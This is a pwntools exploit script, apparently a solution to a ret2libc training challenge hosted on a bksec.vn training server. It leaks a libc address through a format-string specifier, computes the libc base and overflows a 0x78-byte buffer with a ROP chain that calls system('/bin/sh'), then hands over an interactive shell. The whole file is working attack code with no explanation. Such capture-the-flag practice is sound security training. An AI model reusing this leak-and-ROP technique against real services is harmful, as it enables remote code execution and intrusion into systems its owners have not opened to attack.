#!/usr/bin/env python3
from pwn import *

PORT = 1337
HOST = "pwn-ret2libc-23b0eb76c3f6.training.bksec.vn"
elf = context.binary = ELF('./bof_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x000000000040131F
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=True, sni=HOST)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

# GDB()
sla(b'name: ', b'%29$p')
libc.address = int(p.recvline().strip(), 16) - 0x29d90


pl = flat(
    b'A'*0x78,
    libc.address + 0x2a3e5+1,
    libc.address + 0x2a3e5,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
    )

sla(b'string: ', pl)

p.interactive()